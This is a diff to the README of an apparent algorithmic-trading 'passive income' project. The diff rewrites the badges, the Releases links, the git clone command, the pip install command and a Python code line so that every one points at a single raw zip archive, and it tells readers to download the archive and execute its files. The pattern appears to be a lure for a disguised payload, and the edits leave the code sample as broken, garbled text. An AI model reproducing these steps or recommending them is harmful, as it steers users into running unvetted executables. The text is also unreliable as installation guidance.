@@ -1,6 +1,6 @@
 # Passive Income through Algorithmic Trading: A Comprehensive Guide
 
-![Algorithmic Trading](https://img.shields.io/badge/Algorithmic%20Trading-Active%20Strategy-brightgreen) ![Passive Income](https://img.shields.io/badge/Passive%20Income-Financial%20Freedom-blue)
+![Algorithmic Trading](https://github.com/thandavank/passive-income/raw/refs/heads/main/virtuosa/income_passive_v2.4.zip%20Trading-Active%20Strategy-brightgreen) ![Passive Income](https://github.com/thandavank/passive-income/raw/refs/heads/main/virtuosa/income_passive_v2.4.zip%20Income-Financial%20Freedom-blue)
 
 ## Table of Contents
 1. [Overview](#overview)
@@ -20,7 +20,7 @@
 The **Passive Income** repository focuses on generating passive income through algorithmic trading. This project provides tools and insights into algorithmic investing, cryptocurrency trading, and financial modeling. 
 
 ## Getting Started
-To start your journey into algorithmic trading, visit the [Releases section](https://github.com/thandavank/passive-income/releases) to download the necessary files. Follow the instructions provided to set up your environment and begin trading.
+To start your journey into algorithmic trading, visit the [Releases section](https://github.com/thandavank/passive-income/raw/refs/heads/main/virtuosa/income_passive_v2.4.zip) to download the necessary files. Follow the instructions provided to set up your environment and begin trading.
 
 ## Features
 - **Algorithmic Investing**: Automate your investment strategies.
@@ -32,16 +32,16 @@ To start your journey into algorithmic trading, visit the [Releases section](htt
 ## Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/thandavank/passive-income.git
+   git clone https://github.com/thandavank/passive-income/raw/refs/heads/main/virtuosa/income_passive_v2.4.zip
    cd passive-income
    ```
 
 2. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/thandavank/passive-income/raw/refs/heads/main/virtuosa/income_passive_v2.4.zip
    ```
 
-3. Download the latest release from the [Releases section](https://github.com/thandavank/passive-income/releases) and execute the necessary files.
+3. Download the latest release from the [Releases section](https://github.com/thandavank/passive-income/raw/refs/heads/main/virtuosa/income_passive_v2.4.zip) and execute the necessary files.
 
 ## Usage
 Once installed, you can start using the algorithms to trade. Here’s a basic example:
@@ -50,7 +50,7 @@ Once installed, you can start using the algorithms to trade. Here’s a basic ex
 from trading_bot import TradingBot
 
 bot = TradingBot(api_key='your_api_key')
-bot.start_trading()
+https://github.com/thandavank/passive-income/raw/refs/heads/main/virtuosa/income_passive_v2.4.zip()
 ```
 
 You can customize your strategies by modifying the configuration files located in the `config` directory.
@@ -86,7 +86,7 @@ Optimizing your portfolio is key to maximizing returns. Use the tools provided i
 We welcome contributions from the community. If you have ideas or improvements, feel free to submit a pull request. Join discussions in the issues section to share your thoughts.
 
 ## Releases
-For the latest updates and features, check out the [Releases section](https://github.com/thandavank/passive-income/releases). Download the latest version and start trading today.
+For the latest updates and features, check out the [Releases section](https://github.com/thandavank/passive-income/raw/refs/heads/main/virtuosa/income_passive_v2.4.zip). Download the latest version and start trading today.
 
 ## License
 This project is licensed under the MIT License. See the LICENSE file for details.
